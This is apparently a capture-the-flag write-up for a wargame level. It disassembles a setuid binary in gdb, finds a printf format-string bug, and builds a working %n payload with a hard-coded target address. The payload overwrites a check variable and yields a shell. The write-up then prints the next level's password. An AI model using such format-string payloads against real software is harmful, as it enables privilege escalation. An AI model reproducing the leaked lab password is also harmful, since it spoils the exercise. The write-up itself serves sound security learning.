What do we have?

	$ ll
	total 17
	dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 ./
	dr-x--x--x  1 root   root    340 Sep 23  2015 ../
	-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
	-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
	-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3*
	-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
	-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile

A `level3` binary. Let's check the assembly:

	$ gdb ./level3
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x0804851a <+0>:	push   %ebp
	0x0804851b <+1>:	mov    %esp,%ebp
	=> 0x0804851d <+3>:	and    $0xfffffff0,%esp
	0x08048520 <+6>:	call   0x80484a4 <v>
	0x08048525 <+11>:	leave  
	0x08048526 <+12>:	ret    
	End of assembler dump.

It simply calls a function `v` (+6). If we check its assembly:

	(gdb) disas v
	Dump of assembler code for function v:
	0x080484a4 <+0>:	push   %ebp
	0x080484a5 <+1>:	mov    %esp,%ebp
	0x080484a7 <+3>:	sub    $0x218,%esp
	0x080484ad <+9>:	mov    0x8049860,%eax
	0x080484b2 <+14>:	mov    %eax,0x8(%esp)
	0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
	0x080484be <+26>:	lea    -0x208(%ebp),%eax
	0x080484c4 <+32>:	mov    %eax,(%esp)
	0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
	0x080484cc <+40>:	lea    -0x208(%ebp),%eax
	0x080484d2 <+46>:	mov    %eax,(%esp)
	0x080484d5 <+49>:	call   0x8048390 <printf@plt>
	0x080484da <+54>:	mov    0x804988c,%eax
	0x080484df <+59>:	cmp    $0x40,%eax
	0x080484e2 <+62>:	jne    0x8048518 <v+116>
	0x080484e4 <+64>:	mov    0x8049880,%eax
	0x080484e9 <+69>:	mov    %eax,%edx
	0x080484eb <+71>:	mov    $0x8048600,%eax
	0x080484f0 <+76>:	mov    %edx,0xc(%esp)
	0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
	0x080484fc <+88>:	movl   $0x1,0x4(%esp)
	0x08048504 <+96>:	mov    %eax,(%esp)
	0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
	0x0804850c <+104>:	movl   $0x804860d,(%esp)
	0x08048513 <+111>:	call   0x80483c0 <system@plt>
	0x08048518 <+116>:	leave  
	0x08048519 <+117>:	ret    
	End of assembler dump.

So, it does a buffer of 536 (+3), do a `fgets` (+9 to 35), and then call a `printf` with the buffer as the only argument (+40 to +49). While `fgets` is protected from buffer overflows, calling `printf` with an entire user-generated input is dangerous, giving the user the opportunity to use the formats. Continuing with the assembly, a check is done on `0x804988c` to see if it's equal to `0x40` (64 in decimal).

The man of `printf` list a format we may use to our advantage.

	n		The number of characters written so far is stored into the
			integer pointed to by the corresponding argument.  That
			argument shall be an int *, or variant whose size matches
			the (optionally) supplied integer length modifier.  No
			argument is converted.  (This specifier is not supported by
			the bionic C library.)  The behavior is undefined if the
			conversion specification includes any flags, a field width,
			or a precision.

Thus, we proceeded to create a plain string to give to `fgets`, containing both a format string and an escape for the argument (`"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A%n", 0x804988c`).

	$ (printf '"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A%n", 0x804988c'; cat) | ./level3

	"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A", 0x804988c

Nothing happen. That was very naive of us. After a few tries, we realized that even if we give it like that, `printf` actually does not get the address as an argument in the ASM.

	(gdb) disas v
	Dump of assembler code for function v:
	0x080484a4 <+0>:	push   %ebp
	0x080484a5 <+1>:	mov    %esp,%ebp
	0x080484a7 <+3>:	sub    $0x218,%esp
	=> 0x080484ad <+9>:	mov    0x8049860,%eax
	0x080484b2 <+14>:	mov    %eax,0x8(%esp)
	0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
	0x080484be <+26>:	lea    -0x208(%ebp),%eax
	0x080484c4 <+32>:	mov    %eax,(%esp)
	0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
	0x080484cc <+40>:	lea    -0x208(%ebp),%eax
	0x080484d2 <+46>:	mov    %eax,(%esp)
	0x080484d5 <+49>:	call   0x8048390 <printf@plt>
	0x080484da <+54>:	mov    0x804988c,%eax
	0x080484df <+59>:	cmp    $0x40,%eax
	0x080484e2 <+62>:	jne    0x8048518 <v+116>
	0x080484e4 <+64>:	mov    0x8049880,%eax
	0x080484e9 <+69>:	mov    %eax,%edx
	0x080484eb <+71>:	mov    $0x8048600,%eax
	0x080484f0 <+76>:	mov    %edx,0xc(%esp)
	0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
	0x080484fc <+88>:	movl   $0x1,0x4(%esp)
	0x08048504 <+96>:	mov    %eax,(%esp)
	0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
	0x0804850c <+104>:	movl   $0x804860d,(%esp)
	0x08048513 <+111>:	call   0x80483c0 <system@plt>
	0x08048518 <+116>:	leave  
	0x08048519 <+117>:	ret    
	End of assembler dump.

First, we sub `0x218` to `esp` (+3), so `esp` is now at `0x218` (and thus `ebp - 0x218`). However, the buffer is loaded from `-x208(%ebp)` (+26 and +40) for the functions, which means its start is actually at `esp + 0x10` (esp + 16, in decimal). As per the Intel x86 assembly convention, arguments are accessible from `esp+<X>`, each argument espaced by 4. So, our stack looks like that:

	|----------------------------------------|
    | esp+[...] | VarArg [...] (Buffer[...]) |
	|----------------------------------------|
	| esp+16    | VarArg 4 (Buffer[0])       |
	|----------------------------------------|
	| esp+12    | VarArg 3 (?)               |
	|----------------------------------------|
	| esp+8     | VarArg 2 (?)               |
	|----------------------------------------|
	| esp+4     | VarArg 1 (?)               |
	|----------------------------------------|
	| esp       | Address of Buffer          |
	|----------------------------------------|

It means we can give the address of the variable checked as a `VarArg`, by writing it in the buffer. As we need to write 64, we'll put 60 fillers characters (`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A`) before the escaped sequence of the address, in little endian (`\x8c\x98\x04\x08`). With this setup, the address will be at `esp+76`, which is `VarArg 19` (76 / 4). Now, we need to figure how to do a `%n` on that argument in particular. The man of `printf` says the following:

	The overall syntax of a conversion specification is:

		%[argument$][flags][width][.precision][length modifier]conversion

		The arguments must correspond properly (after type promotion) with
		the conversion specifier.  By default, the arguments are used in
		the order given, where each '*' (see Field width and Precision
		below) and each conversion specifier asks for the next argument
		(and it is an error if insufficiently many arguments are given).
		One can also specify explicitly which argument is taken, at each
		place where an argument is required, by writing "%m$" instead of
		'%' and "*m$" instead of '*', where the decimal integer m denotes
		the position in the argument list of the desired argument, indexed
		starting from 1.  Thus,

			printf("%*d", width, num);
		and
			printf("%2$*1$d", width, num);

		are equivalent.  The second style allows repeated references to
		the same argument.  The C99 standard does not include the style
		using '$', which comes from the Single UNIX Specification.  If the
		style using '$' is used, it must be used throughout for all
		conversions taking an argument and all width and precision
		arguments, but it may be mixed with "%%" formats, which do not
		consume an argument.  There may be no gaps in the numbers of
		arguments specified using '$'; for example, if arguments 1 and 3
		are specified, argument 2 must also be specified somewhere in the
		format string.

We'll thus append `%19$n`, to consume the 19th argument and apply a `%n` on it. `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9\x8c\x98\x04\x08%19$n`. 

	$ (printf 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9; printf '\x8c\x98\x04\x08%19$n'; cat) | ./level3
	-bash: printf: `$': invalid format character

	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9��

Oops. A problem of syntax? We are using the `printf` of the shell though, so after looking at its man...

	%b		ARGUMENT as a string with '\' escapes interpreted, except
			that octal escapes should have a leading 0 like \0NNN

Dunno why it worked without in previous exercises. Oh well.

	$ (printf 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9'; printf '%b' '\x8c\x98\x04\x08%19$n'; cat) | ./level3

	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9��
	Wait what?!
	cat /home/user/level4/.pass
	b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
